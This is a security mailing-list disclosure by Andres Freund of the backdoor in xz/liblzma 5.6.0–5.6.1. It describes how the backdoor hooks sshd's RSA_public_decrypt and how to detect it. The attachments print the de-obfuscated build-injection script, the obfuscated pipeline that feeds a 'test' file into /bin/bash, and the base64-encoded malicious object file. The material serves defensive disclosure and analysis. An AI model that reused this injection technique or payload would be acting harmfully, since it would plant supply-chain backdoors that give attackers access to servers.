Received: (qmail 1913 invoked by uid 550); 29 Mar 2024 16:03:34 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 7404 invoked from network); 29 Mar 2024 15:46:45 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=anarazel.de; h=
	cc:content-transfer-encoding:content-type:content-type:date:date
	:from:from:in-reply-to:message-id:mime-version:reply-to:subject
	:subject:to:to; s=fm2; t=1711727488; x=1711813888; bh=HbjIUNyzYM
	Bp4rnyqc8qGsxEZGwXCk2/Ci4GhVEAQw4=; b=hxC7hN2BJ7J+4nRVtg5rHBAlL8
	5D26mTbLTmhOeAwETTwpzcJ1aCDq6ZIPjOaRk9xaFMte1V61ZcfURPTMTiwfhJRr
	JfgGdl61/RXpdW4QsSJ3kNHiX6PynauaMYV+YkzFdMWlgIgo+8eFat2AmaeYl4fM
	jZw9GrCW214YMxY3uampo1P0fU+GVk5ohPocHRckejVY++4RZz+bd/neH+hrnE/a
	bHzzeuu9016snlSRR7lX1Kru9j4esktBi7ei5Enxoi5qeXZgaEox7f7k71/5CFNt
	HS6LvV30QMgMzKFxyFotvueCrPO2jMdHAD111ORDC7g+H3vyLMLaKqxg4ORA==
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=
	messagingengine.com; h=cc:content-transfer-encoding:content-type
	:content-type:date:date:feedback-id:feedback-id:from:from
	:in-reply-to:message-id:mime-version:reply-to:subject:subject:to
	:to:x-me-proxy:x-me-proxy:x-me-sender:x-me-sender:x-sasl-enc; s=
	fm2; t=1711727488; x=1711813888; bh=HbjIUNyzYMBp4rnyqc8qGsxEZGwX
	Ck2/Ci4GhVEAQw4=; b=Byk4jgphi+cjZUAGtVobw1zFpCXNAK/721w1JspUIEV/
	vNF2pYP3CjACLpJytrgczf7VZ3eoJeXjfxWiQrpdvF9GzAIR+VEYHbUBVoj1JCLq
	L6uutntJoSEZ0ih7XHuHhTDJEXFGULNOeh9nEqB3rbXGIiYWc+8wtvfMysWxC+wC
	s9X/yJv49N1hzCWFnX1X7sUPSaX+AghmF1gccN5dRegqK5wYi9LpQNhwzJKh3uO4
	Hr8mFwBQmajyI/gj+IpQ5K7wt/S2G7LVXMtG7S8SEvfyIq0SnKm8cUhYIr/Ediqo
	M7g1YwzQSQYeNqHaGryqIf+TElqNMDQXavu4eF2PpQ==
X-ME-Sender: <xms:f-MGZrxwtp83IrwXeiCDyxtokZw4wljjn6vDn8jvWWTKPv3LRonrtw>
    <xme:f-MGZjQEPSeH7XT-YqpQKzw57aKFfATjsF48PXVuRQw3kQL1KFIxSwm_Fv7HXPSdj
    QW1ROsyWAwKQbr0LA>
X-ME-Received: <xmr:f-MGZlXaEXZdTM0lbtXIxi2NEvPrbDDe6-t7g0BD1xwAkOpt4Z6uqtfB4lpiELggoAC7_p0JuIGOL2iy8nhC22DhSGxbUdWSo3BIGyQvcl3xLmOPjnVg5e7697ec>
X-ME-Proxy-Cause: gggruggvucftvghtrhhoucdtuddrgedvledruddvvddgkedvucetufdoteggodetrfdotf
    fvucfrrhhofhhilhgvmecuhfgrshhtofgrihhlpdfqfgfvpdfurfetoffkrfgpnffqhgen
    uceurghilhhouhhtmecufedttdenucenucfjughrpeffhffvuffkgggtugfgsehmkeerre
    dttdejnecuhfhrohhmpeetnhgurhgvshcuhfhrvghunhguuceorghnughrvghssegrnhgr
    rhgriigvlhdruggvqeenucggtffrrghtthgvrhhnpeegieffkeduhfefhfeiudfhheelke
    ffueehheduveevudduhfdvfffhhfejveetleenucffohhmrghinhepuggvsghirghnrdho
    rhhgpdhgihhthhhusgdrtghomhenucevlhhushhtvghrufhiiigvpedtnecurfgrrhgrmh
    epmhgrihhlfhhrohhmpegrnhgurhgvshesrghnrghrrgiivghlrdguvg
X-ME-Proxy: <xmx:f-MGZljAAZF8oIiTjoHJk68btREpve-0TYBHzZcKROspIRYtZfeFsQ>
    <xmx:f-MGZtC58S1HpvqwheX-YWEt4U7qeUfY-Ny3HNY444ZaTa5WRQ6o3Q>
    <xmx:f-MGZuKZg-nSFE7XckvdYe4GtlaNImf5O2W-dxEFaxmmZEjAPQ22PA>
    <xmx:f-MGZsAiP_QDHEdJEvsWtA4acf5BGilo4JB-pST3LJYvaIhoxZPo2g>
    <xmx:gOMGZgoNftC3cIxOo9aVFpuH3vJnlhQId8Z1zEtVe-Y3pM9wWttT0g>
Feedback-ID: id4a34324:Fastmail
Date: Fri, 29 Mar 2024 08:51:26 -0700
From: Andres Freund <andres@anarazel.de>
To: oss-security@lists.openwall.com
Message-ID: <20240329155126.kjjfduxw2yrlxgzm@awork3.anarazel.de>
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="6ajwtgiugazlov2b"
Content-Disposition: inline
Content-Transfer-Encoding: 8bit
Subject: [oss-security] backdoor in upstream xz/liblzma leading to ssh server compromise

--6ajwtgiugazlov2b
Content-Type: text/plain; charset=utf-8
Content-Disposition: inline
Content-Transfer-Encoding: 8bit

Hi,

After observing a few odd symptoms around liblzma (part of the xz package) on
Debian sid installations over the last weeks (logins with ssh taking a lot of
CPU, valgrind errors) I figured out the answer:

The upstream xz repository and the xz tarballs have been backdoored.

At first I thought this was a compromise of debian's package, but it turns out
to be upstream.


== Compromised Release Tarball ==

One portion of the backdoor is *solely in the distributed tarballs*. For
easier reference, here's a link to debian's import of the tarball, but it is
also present in the tarballs for 5.6.0 and 5.6.1:

https://salsa.debian.org/debian/xz-utils/-/blob/debian/unstable/m4/build-to-host.m4?ref_type=heads#L63

That line is *not* in the upstream source of build-to-host, nor is
build-to-host used by xz in git.  However, it is present in the tarballs
released upstream, except for the "source code" links, which I think github
generates directly from the repository contents:

https://github.com/tukaani-project/xz/releases/tag/v5.6.0
https://github.com/tukaani-project/xz/releases/tag/v5.6.1


This injects an obfuscated script to be executed at the end of configure. This
script is fairly obfuscated and data from "test" .xz files in the repository.


This script is executed and, if some preconditions match, modifies
$builddir/src/liblzma/Makefile to contain

am__test = bad-3-corrupt_lzma2.xz
...
am__test_dir=$(top_srcdir)/tests/files/$(am__test)
...
sed rpath $(am__test_dir) | $(am__dist_setup) >/dev/null 2>&1


which ends up as
...; sed rpath ../../../tests/files/bad-3-corrupt_lzma2.xz | tr "	 \-_" " 	_\-" | xz -d | /bin/bash >/dev/null 2>&1; ...

Leaving out the "| bash" that produces

####Hello####
#��Z�.hj�
eval `grep ^srcdir= config.status`
if test -f ../../config.status;then
eval `grep ^srcdir= ../../config.status`
srcdir="../../$srcdir"
fi
export i="((head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +724)";(xz -dc $srcdir/tests/files/good-large_compressed.lzma|eval $i|tail -c +31265|tr "\5-\51\204-\377\52-\115\132-\203\0-\4\116-\131" "\0-\377")|xz -F raw --lzma1 -dc|/bin/sh
####World####

After de-obfuscation this leads to the attached injected.txt.


== Compromised Repository ==

The files containing the bulk of the exploit are in an obfuscated form in
  tests/files/bad-3-corrupt_lzma2.xz
  tests/files/good-large_compressed.lzma
committed upstream. They were initially added in
https://github.com/tukaani-project/xz/commit/cf44e4b7f5dfdbf8c78aef377c10f71e274f63c0

Note that the files were not even used for any "tests" in 5.6.0.


Subsequently the injected code (more about that below) caused valgrind errors
and crashes in some configurations, due the stack layout differing from what
the backdoor was expecting.  These issues were attempted to be worked around
in 5.6.1:

https://github.com/tukaani-project/xz/commit/e5faaebbcf02ea880cfc56edc702d4f7298788ad
https://github.com/tukaani-project/xz/commit/72d2933bfae514e0dbb123488e9f1eb7cf64175f
https://github.com/tukaani-project/xz/commit/82ecc538193b380a21622aea02b0ba078e7ade92

For which the exploit code was then adjusted:
https://github.com/tukaani-project/xz/commit/6e636819e8f070330d835fce46289a3ff72a7b89

Given the activity over several weeks, the committer is either directly
involved or there was some quite severe compromise of their
system. Unfortunately the latter looks like the less likely explanation, given
they communicated on various lists about the "fixes" mentioned above.


Florian Weimer first extracted the injected code in isolation, also attached,
liblzma_la-crc64-fast.o, I had only looked at the whole binary. Thanks!


== Affected Systems ==

The attached de-obfuscated script is invoked first after configure, where it
decides whether to modify the build process to inject the code.

These conditions include targeting only x86-64 linux:
    if ! (echo "$build" | grep -Eq "^x86_64" > /dev/null 2>&1) && (echo "$build" | grep -Eq "linux-gnu$" > /dev/null 2>&1);then

Building with gcc and the gnu linker
    if test "x$GCC" != 'xyes' > /dev/null 2>&1;then
    exit 0
    fi
    if test "x$CC" != 'xgcc' > /dev/null 2>&1;then
    exit 0
    fi
    LDv=$LD" -v"
    if ! $LDv 2>&1 | grep -qs 'GNU ld' > /dev/null 2>&1;then
    exit 0

Running as part of a debian or RPM package build:
    if test -f "$srcdir/debian/rules" || test "x$RPM_ARCH" = "xx86_64";then

Particularly the latter is likely aimed at making it harder to reproduce the
issue for investigators.


Due to the working of the injected code (see below), it is likely the backdoor
can only work on glibc based systems.


Luckily xz 5.6.0 and 5.6.1 have not yet widely been integrated by linux
distributions, and where they have, mostly in pre-release versions.


== Observing Impact on openssh server ==

With the backdoored liblzma installed, logins via ssh become a lot slower.

time ssh nonexistant@localhost

before:
nonexistant@localhost: Permission denied (publickey).

before:
real	0m0.299s
user	0m0.202s
sys	0m0.006s

after:
nonexistant@localhost: Permission denied (publickey).

real	0m0.807s
user	0m0.202s
sys	0m0.006s


openssh does not directly use liblzma. However debian and several other
distributions patch openssh to support systemd notification, and libsystemd
does depend on lzma.


Initially starting sshd outside of systemd did not show the slowdown, despite
the backdoor briefly getting invoked. This appears to be part of some
countermeasures to make analysis harder.

Observed requirements for the exploit:
a) TERM environment variable is not set
b) argv[0] needs to be /usr/sbin/sshd
c) LD_DEBUG, LD_PROFILE are not set
d) LANG needs to be set
e) Some debugging environments, like rr, appear to be detected. Plain gdb
   appears to be detected in some situations, but not others

To reproduce outside of systemd, the server can be started with a clear
environment, setting only the required variable:

env -i LANG=en_US.UTF-8 /usr/sbin/sshd -D


In fact, openssh does not need to be started as a server to observe the
slowdown:

slow:
env -i LANG=C /usr/sbin/sshd -h

(about 0.5s on my older system)


fast:
env -i LANG=C TERM=foo /usr/sbin/sshd -h
env -i LANG=C LD_DEBUG=statistics /usr/sbin/sshd -h
...

(about 0.01s on the same system)


It's possible that argv[0] other /usr/sbin/sshd also would have effect - there
are obviously lots of servers linking to libsystemd.


== Analyzing the injected code ==

I am *not* a security researcher, nor a reverse engineer.  There's lots of
stuff I have not analyzed and most of what I observed is purely from
observation rather than exhaustively analyzing the backdoor code.

To analyze I primarily used "perf record -e intel_pt//ub" to observe where
execution diverges between the backdoor being active and not. Then also gdb,
setting breakpoints before the divergence.


The backdoor initially intercepts execution by replacing the ifunc resolvers
crc32_resolve(), crc64_resolve() with different code, which calls
_get_cpuid(), injected into the code (which previously would just be static
inline functions).  In xz 5.6.1 the backdoor was further obfuscated, removing
symbol names.

These functions get resolved during startup, because sshd is built with
-Wl,-z,now, leading to all symbols being resolved early. If started with
LD_BIND_NOT=1 the backdoor does not appear to work.


Below crc32_resolve() _get_cpuid() does not do much, it just sees that a
'completed' variable is 0 and increments it, returning the normal cpuid result
(via a new _cpuid()). It gets to be more interesting during crc64_resolve().

In the second invocation crc64_resolve() appears to find various information,
like data from the dynamic linker, program arguments and environment. Then it
perform various environment checks, including those above. There are other
checks I have not fully traced.

If the above decides to continue, the code appears to be parsing the symbol
tables in memory. This is the quite slow step that made me look into the issue.


Notably liblzma's symbols are resolved before many of the other libraries,
including the symbols in the main sshd binary.  This is important because
symbols are resolved, the GOT gets remapped read-only thanks to -Wl,-z,relro.


To be able to resolve symbols in libraries that have not yet loaded, the
backdoor installs an audit hook into the dynamic linker, which can be observed
with gdb using
  watch _rtld_global_ro._dl_naudit
It looks like the audit hook is only installed for the main binary.

That hook gets called, from _dl_audit_symbind, for numerous symbols in the
main binary. It appears to wait for "RSA_public_decrypt@got.plt" to be
resolved.  When called for that symbol, the backdoor changes the value of
RSA_public_decrypt@got.plt to point to its own code.  It does not do this via
the audit hook mechanism, but outside of it.

For reasons I do not yet understand, it does change sym.st_value *and* the
return value of from the audit hook to a different value, which leads
_dl_audit_symbind() to do nothing - why change anything at all then?

After that the audit hook is uninstalled again.

It is possible to change the got.plt contents at this stage because it has not
(and can't yet) been remapped to be read-only.


I suspect there might be further changes performed at this stage.


== Impact on sshd ==

The prior section explains that RSA_public_decrypt@got.plt was redirected to
point into the backdoor code. The trace I was analyzing indeed shows that
during a pubkey login the exploit code is invoked:

            sshd 1736357 [010] 714318.734008:          1  branches:uH:      5555555ded8c ssh_rsa_verify+0x49c (/usr/sbin/sshd) =>     5555555612d0 RSA_public_decrypt@plt+0x0 (/usr/sbin/sshd)

The backdoor then calls back into libcrypto, presumably to perform normal authentication

            sshd 1736357 [010] 714318.734009:          1  branches:uH:      7ffff7c137cd [unknown] (/usr/lib/x86_64-linux-gnu/liblzma.so.5.6.0) =>     7ffff792a2b0 RSA_get0_key+0x0 (/usr/lib/x86_64-linux-gnu/libcrypto.so.3)


I have not yet analyzed precisely what is being checked for in the injected
code, to allow unauthorized access. Since this is running in a
pre-authentication context, it seems likely to allow some form of access or
other form of remote code execution.

I'd upgrade any potentially vulnerable system ASAP.


== Bug reports ==

Given the apparent upstream involvement I have not reported an upstream
bug. As I initially thought it was a debian specific issue, I sent a more
preliminary report to security@debian.org.  Subsequently I reported the issue
to distros@. CISA was notified by a distribution.

Red Hat assigned this issue CVE-2024-3094.


== Detecting if installation is vulnerable ==

Vegard Nossum wrote a script to detect if it's likely that the ssh binary on a
system is vulnerable, attached here. Thanks!


Greetings,

Andres Freund

--6ajwtgiugazlov2b
Content-Type: text/plain; charset=us-ascii
Content-Disposition: attachment; filename="injected.txt"

P="-fPIC -DPIC -fno-lto -ffunction-sections -fdata-sections"
C="pic_flag=\" $P\""
O="^pic_flag=\" -fPIC -DPIC\"$"
R="is_arch_extension_supported"
x="__get_cpuid("
p="good-large_compressed.lzma"
U="bad-3-corrupt_lzma2.xz"
eval $zrKcVq
if test -f config.status; then
eval $zrKcSS
eval `grep ^LD=\'\/ config.status`
eval `grep ^CC=\' config.status`
eval `grep ^GCC=\' config.status`
eval `grep ^srcdir=\' config.status`
eval `grep ^build=\'x86_64 config.status`
eval `grep ^enable_shared=\'yes\' config.status`
eval `grep ^enable_static=\' config.status`
eval `grep ^gl_path_map=\' config.status`
eval $zrKccj
if ! grep -qs '\["HAVE_FUNC_ATTRIBUTE_IFUNC"\]=" 1"' config.status > /dev/null 2>&1;then
exit 0
fi
if ! grep -qs 'define HAVE_FUNC_ATTRIBUTE_IFUNC 1' config.h > /dev/null 2>&1;then
exit 0
fi
if test "x$enable_shared" != "xyes";then
exit 0
fi
if ! (echo "$build" | grep -Eq "^x86_64" > /dev/null 2>&1) && (echo "$build" | grep -Eq "linux-gnu$" > /dev/null 2>&1);then
exit 0
fi
if ! grep -qs "$R()" $srcdir/src/liblzma/check/crc64_fast.c > /dev/null 2>&1; then
exit 0
fi
if ! grep -qs "$R()" $srcdir/src/liblzma/check/crc32_fast.c > /dev/null 2>&1; then
exit 0
fi
if ! grep -qs "$R" $srcdir/src/liblzma/check/crc_x86_clmul.h > /dev/null 2>&1; then
exit 0
fi
if ! grep -qs "$x" $srcdir/src/liblzma/check/crc_x86_clmul.h > /dev/null 2>&1; then
exit 0
fi
if test "x$GCC" != 'xyes' > /dev/null 2>&1;then
exit 0
fi
if test "x$CC" != 'xgcc' > /dev/null 2>&1;then
exit 0
fi
LDv=$LD" -v"
if ! $LDv 2>&1 | grep -qs 'GNU ld' > /dev/null 2>&1;then
exit 0
fi
if ! test -f "$srcdir/tests/files/$p" > /dev/null 2>&1;then
exit 0
fi
if ! test -f "$srcdir/tests/files/$U" > /dev/null 2>&1;then
exit 0
fi
if test -f "$srcdir/debian/rules" || test "x$RPM_ARCH" = "xx86_64";then
eval $zrKcst
j="^ACLOCAL_M4 = \$(top_srcdir)\/aclocal.m4"
if ! grep -qs "$j" src/liblzma/Makefile > /dev/null 2>&1;then
exit 0
fi
z="^am__uninstall_files_from_dir = {"
if ! grep -qs "$z" src/liblzma/Makefile > /dev/null 2>&1;then
exit 0
fi
w="^am__install_max ="
if ! grep -qs "$w" src/liblzma/Makefile > /dev/null 2>&1;then
exit 0
fi
E=$z
if ! grep -qs "$E" src/liblzma/Makefile > /dev/null 2>&1;then
exit 0
fi
Q="^am__vpath_adj_setup ="
if ! grep -qs "$Q" src/liblzma/Makefile > /dev/null 2>&1;then
exit 0
fi
M="^am__include = include"
if ! grep -qs "$M" src/liblzma/Makefile > /dev/null 2>&1;then
exit 0
fi
L="^all: all-recursive$"
if ! grep -qs "$L" src/liblzma/Makefile > /dev/null 2>&1;then
exit 0
fi
m="^LTLIBRARIES = \$(lib_LTLIBRARIES)"
if ! grep -qs "$m" src/liblzma/Makefile > /dev/null 2>&1;then
exit 0
fi
u="AM_V_CCLD = \$(am__v_CCLD_\$(V))"
if ! grep -qs "$u" src/liblzma/Makefile > /dev/null 2>&1;then
exit 0
fi
if ! grep -qs "$O" libtool > /dev/null 2>&1;then
exit 0
fi
eval $zrKcTy
b="am__test = $U"
sed -i "/$j/i$b" src/liblzma/Makefile || true
d=`echo $gl_path_map | sed 's/\\\/\\\\\\\\/g'`
b="am__strip_prefix = $d"
sed -i "/$w/i$b" src/liblzma/Makefile || true
b="am__dist_setup = \$(am__strip_prefix) | xz -d 2>/dev/null | \$(SHELL)"
sed -i "/$E/i$b" src/liblzma/Makefile || true
b="\$(top_srcdir)/tests/files/\$(am__test)"
s="am__test_dir=$b"
sed -i "/$Q/i$s" src/liblzma/Makefile || true
h="-Wl,--sort-section=name,-X"
if ! echo "$LDFLAGS" | grep -qs -e "-z,now" -e "-z -Wl,now" > /dev/null 2>&1;then
h=$h",-z,now"
fi
j="liblzma_la_LDFLAGS += $h"
sed -i "/$L/i$j" src/liblzma/Makefile || true
sed -i "s/$O/$C/g" libtool || true
k="AM_V_CCLD = @echo -n \$(LTDEPS); \$(am__v_CCLD_\$(V))"
sed -i "s/$u/$k/" src/liblzma/Makefile || true
l="LTDEPS='\$(lib_LTDEPS)'; \\\\\n\
    export top_srcdir='\$(top_srcdir)'; \\\\\n\
    export CC='\$(CC)'; \\\\\n\
    export DEFS='\$(DEFS)'; \\\\\n\
    export DEFAULT_INCLUDES='\$(DEFAULT_INCLUDES)'; \\\\\n\
    export INCLUDES='\$(INCLUDES)'; \\\\\n\
    export liblzma_la_CPPFLAGS='\$(liblzma_la_CPPFLAGS)'; \\\\\n\
    export CPPFLAGS='\$(CPPFLAGS)'; \\\\\n\
    export AM_CFLAGS='\$(AM_CFLAGS)'; \\\\\n\
    export CFLAGS='\$(CFLAGS)'; \\\\\n\
    export AM_V_CCLD='\$(am__v_CCLD_\$(V))'; \\\\\n\
    export liblzma_la_LINK='\$(liblzma_la_LINK)'; \\\\\n\
    export libdir='\$(libdir)'; \\\\\n\
    export liblzma_la_OBJECTS='\$(liblzma_la_OBJECTS)'; \\\\\n\
    export liblzma_la_LIBADD='\$(liblzma_la_LIBADD)'; \\\\\n\
sed rpath \$(am__test_dir) | \$(am__dist_setup) >/dev/null 2>&1";
sed -i "/$m/i$l" src/liblzma/Makefile || true
eval $zrKcHD
fi
elif (test -f .libs/liblzma_la-crc64_fast.o) && (test -f .libs/liblzma_la-crc32_fast.o); then
eval $zrKcKQ
if ! grep -qs "$R()" $top_srcdir/src/liblzma/check/crc64_fast.c; then
exit 0
fi
if ! grep -qs "$R()" $top_srcdir/src/liblzma/check/crc32_fast.c; then
exit 0
fi
if ! grep -qs "$R" $top_srcdir/src/liblzma/check/crc_x86_clmul.h; then
exit 0
fi
if ! grep -qs "$x" $top_srcdir/src/liblzma/check/crc_x86_clmul.h; then
exit 0
fi
if ! grep -qs "$C" ../../libtool; then
exit 0
fi
if ! echo $liblzma_la_LINK | grep -qs -e "-z,now" -e "-z -Wl,now" > /dev/null 2>&1;then
exit 0
fi
if echo $liblzma_la_LINK | grep -qs -e "lazy" > /dev/null 2>&1;then
exit 0
fi
N=0
W=0
Y=`grep "dnl Convert it to C string syntax." $top_srcdir/m4/gettext.m4`
eval $zrKcjv
if test -z "$Y"; then
N=0
W=88792
else
N=88792
W=0
fi
xz -dc $top_srcdir/tests/files/$p | eval $i | LC_ALL=C sed "s/\(.\)/\1\n/g" | LC_ALL=C awk 'BEGIN{FS="\n";RS="\n";ORS="";m=256;for(i=0;i<m;i++){t[sprintf("x%c",i)]=i;c[i]=((i*7)+5)%m;}i=0;j=0;for(l=0;l<4096;l++){i=(i+1)%m;a=c[i];j=(j+a)%m;c[i]=c[j];c[j]=a;}}{v=t["x" (NF<1?RS:$1)];i=(i+1)%m;a=c[i];j=(j+a)%m;b=c[j];c[i]=b;c[j]=a;k=c[(a+b)%m];printf "%c",(v+k)%m}' | xz -dc --single-stream | ((head -c +$N > /dev/null 2>&1) && head -c +$W) > liblzma_la-crc64-fast.o || true
if ! test -f liblzma_la-crc64-fast.o; then
exit 0
fi
cp .libs/liblzma_la-crc64_fast.o .libs/liblzma_la-crc64-fast.o || true
V='#endif\n#if defined(CRC32_GENERIC) && defined(CRC64_GENERIC) && defined(CRC_X86_CLMUL) && defined(CRC_USE_IFUNC) && defined(PIC) && (defined(BUILDING_CRC64_CLMUL) || defined(BUILDING_CRC32_CLMUL))\nextern int _get_cpuid(int, void*, void*, void*, void*, void*);\nstatic inline bool _is_arch_extension_supported(void) { int success = 1; uint32_t r[4]; success = _get_cpuid(1, &r[0], &r[1], &r[2], &r[3], ((char*) __builtin_frame_address(0))-16); const uint32_t ecx_mask = (1 << 1) | (1 << 9) | (1 << 19); return success && (r[2] & ecx_mask) == ecx_mask; }\n#else\n#define _is_arch_extension_supported is_arch_extension_supported'
eval $yosA
if sed "/return is_arch_extension_supported()/ c\return _is_arch_extension_supported()" $top_srcdir/src/liblzma/check/crc64_fast.c | \
sed "/include \"crc_x86_clmul.h\"/a \\$V" | \
sed "1i # 0 \"$top_srcdir/src/liblzma/check/crc64_fast.c\"" 2>/dev/null | \
$CC $DEFS $DEFAULT_INCLUDES $INCLUDES $liblzma_la_CPPFLAGS $CPPFLAGS $AM_CFLAGS $CFLAGS -r liblzma_la-crc64-fast.o -x c -  $P -o .libs/liblzma_la-crc64_fast.o 2>/dev/null; then
cp .libs/liblzma_la-crc32_fast.o .libs/liblzma_la-crc32-fast.o || true
eval $BPep
if sed "/return is_arch_extension_supported()/ c\return _is_arch_extension_supported()" $top_srcdir/src/liblzma/check/crc32_fast.c | \
sed "/include \"crc32_arm64.h\"/a \\$V" | \
sed "1i # 0 \"$top_srcdir/src/liblzma/check/crc32_fast.c\"" 2>/dev/null | \
$CC $DEFS $DEFAULT_INCLUDES $INCLUDES $liblzma_la_CPPFLAGS $CPPFLAGS $AM_CFLAGS $CFLAGS -r -x c -  $P -o .libs/liblzma_la-crc32_fast.o; then
eval $RgYB
if $AM_V_CCLD$liblzma_la_LINK -rpath $libdir $liblzma_la_OBJECTS $liblzma_la_LIBADD; then
if test ! -f .libs/liblzma.so; then
mv -f .libs/liblzma_la-crc32-fast.o .libs/liblzma_la-crc32_fast.o || true
mv -f .libs/liblzma_la-crc64-fast.o .libs/liblzma_la-crc64_fast.o || true
fi
rm -fr .libs/liblzma.a .libs/liblzma.la .libs/liblzma.lai .libs/liblzma.so* || true
else
mv -f .libs/liblzma_la-crc32-fast.o .libs/liblzma_la-crc32_fast.o || true
mv -f .libs/liblzma_la-crc64-fast.o .libs/liblzma_la-crc64_fast.o || true
fi
rm -f .libs/liblzma_la-crc32-fast.o || true
rm -f .libs/liblzma_la-crc64-fast.o || true
else
mv -f .libs/liblzma_la-crc32-fast.o .libs/liblzma_la-crc32_fast.o || true
mv -f .libs/liblzma_la-crc64-fast.o .libs/liblzma_la-crc64_fast.o || true
fi
else
mv -f .libs/liblzma_la-crc64-fast.o .libs/liblzma_la-crc64_fast.o || true
fi
rm -f liblzma_la-crc64-fast.o || true
fi
eval $DHLd

--6ajwtgiugazlov2b
Content-Type: application/gzip
Content-Disposition: attachment; filename="liblzma_la-crc64-fast.o.gz"
Content-Transfer-Encoding: base64

H4sICCadBWYAA2xpYmx6bWFfbGEtY3JjNjQtZmFzdC5vAOy9e3xU1dU3fs7M
JJlA4AwXMSrqgKOGemlCqGYEdIYkcgYmGgUk9VLuGCtImsxAvJIwGcnJcd5S
L61PL09ptc9Da9vHekGgCpMESNBWY6hKpdWAFxhHMYCGgMD81lp7nzN7JjPt
+3vf358/PsY553v22Xvttddee621L2dtpf9GiyxLxj9Zul5K3iX/1VyURD38
/8eko9Jx5aJT3rlbLQD4tK+2j4bfear2zrYb4WKOqn1TklBDnzsP4wvhqNLy
Yo4klUa3joNbVf/Grx08/pzP/bkSum6YJCmbLdPuXjN12lVrRk9TlJbXIc20
y5TwcCg4vkDdLhOVUSmi9qrKM2/W+6fdrbSsx0TLlfBe+I3fOq0/cNGaURF1
WtNJWXn0KcBif4X/haIjp8nK+g64bCt3bJKV8JVARqhbbi13tFlay8fGv4u4
RQmPJdzC8XPiXsRtgWFND46DQgZskrTJqUZmQA63Qcqm2Q5b2+jWOeNiag7L
2q6E37ZhFnaexblqoiN2FTztKi9SsNKJjniwbbZjoN2phP8LkmrlRZ6260J7
HGqkXm6d7fC0PlioTv26fmLs8nzIqK9/midYAAU52yzwbmv5BerUd+ofjA2D
hxVtM+T2Pvvu8gs8oW6lorX8PMisbZYcPZkXOnA61F7ROvsCT1NiV3C0GrlN
Vt2fKevOAAtjb9qh8ZoSO5XwpUCAp+0BWT8R+vRiT9MhTzA3tMcCrw3MkJ1B
W9PsC+TEm56msxbl0Qp4Kfa1Fao5rOmkEiww6qMfi/9K2dyuRr6DTezVur1a
hzfUl+dt/8w6Q9k8ZVyF8sxuZd2f4U11RzH/px/1aW8Dsao2zbXjhtMJqyd6
JLdq0gG1/dBloU+tQHi1qj3ksqs7hmOu1kQCbx3qjq5LJSkxPCrhbaGqT/lK
3Xsk9KmstOiQrOnkCWX9BrpoX3Nx08l71ixtOnnlmvLI/d9AdZ1rGtUdTvyH
ojI11H79DpQnde8hVTsJT+C6W3JKavhkcNaJdpQ1EmpVqTwav17dwaRPKgzF
rgLpe2urjZ7NOBqfqFI+kty0NtS+tunk9as/jI+sLNnv1+5Q4yO2Y7qm2aPs
qtagqpERmBLZMqpCa9971tMEtIe/B+IRaV2YSCRCJ61r8iF1TuxjKLtt9qiB
dnuwwK9d4ovcIsduhXIGyh1OpQWfDpRfYFda3regkAxO3wL5KuG/4B2IUle5
Cs0ltc4eBVLhhKbCx7E/wlN9dlH7Abs2uwg62/B2Er7J+puhA2eaTpYFL4Dc
HUpYsZCcgqAp677BF3+RC4B2VI1MR/LV9pg1dOBiZfM0Bd/M25sAyYEm2Afk
NT049nhwGEjMRUrLOzkoHqf0fv+kQyDV1Zh5wKq80q8dbT7QDxk1n2yC/wfK
PMpmFLKGNXmhk6tWO+NXN8eexV57cuKaMb4tsuzx5KF22XvY29QnBx2VJXv8
2mw1PpbaIJ6zVTZZPBuo9EdykMrQp3mMzkpls83uVZ7pV9ah+A6Uj4JO+gy8
A2xVI/NlVZtjV8O9SkshYKHDTcCTLZhjbEtOBnZpu6kauc2fQnOBuPd7m/uk
BAh+86BUJklBn36WtzIS8KU1dAgYVeBWnjmqhF4BtLIkqmpv+7VyldPpn3TA
C6wsA5FXnjmhhP6ORfuBUODKbuBK/5o5098AbM3o0KB7TVFo8No1V0TUvtBJ
S3wCSp5dckgoPlOAHnXvl9gUgQlxe0TdiMJ0rqr1+Cf1tZZXI4HXAbfvjf0I
0utv6mehz9lCBxQoQw6Mhf/bApd7WgaCY0OHhkN3scbzm07mrxkBGRYEx5dE
Y7+1YccaEXDEj22fPx47zhEU3/hBVX8dKgH08yKCpaHDs0KDltVXUKOALBI7
Gy2M+cFvEeNBntedBZJBPb4Dj5Et5WpsDoqe3gOiFzt8kp6iFIbG2xAuV5XN
k9XQoBy8COqkKtvfhE7lUeUOaPgyzBRaMnYtFKaSZICmkNRLZoNivVVWdzBk
uaS6TwYvgkwswWFIGonQSLi3BYlU6vKgKUO/tdKApOoPqiooWXX4bjWUgBHi
E0yglXv8kw6qyg6kugwHBCg+9jI8GmiHnvA41iLUYaGMFqLmwyFj8zB16i4l
VE0Zk+ZWh4PenAXJYkrITTDcROqt7Qccan676j6ihCay1Nb2vsLh7aAQ1Keh
xOKBdpvS4pApY5vqPqyETlnoJoeK+ILd5NJNH7vJo2R74abpAHSAAxJ1AORj
AisBXQBG53OgRfTyotjXp4H3kVkyUfZLC1EmA2UWFUkb3k2krSd8BmB9hViT
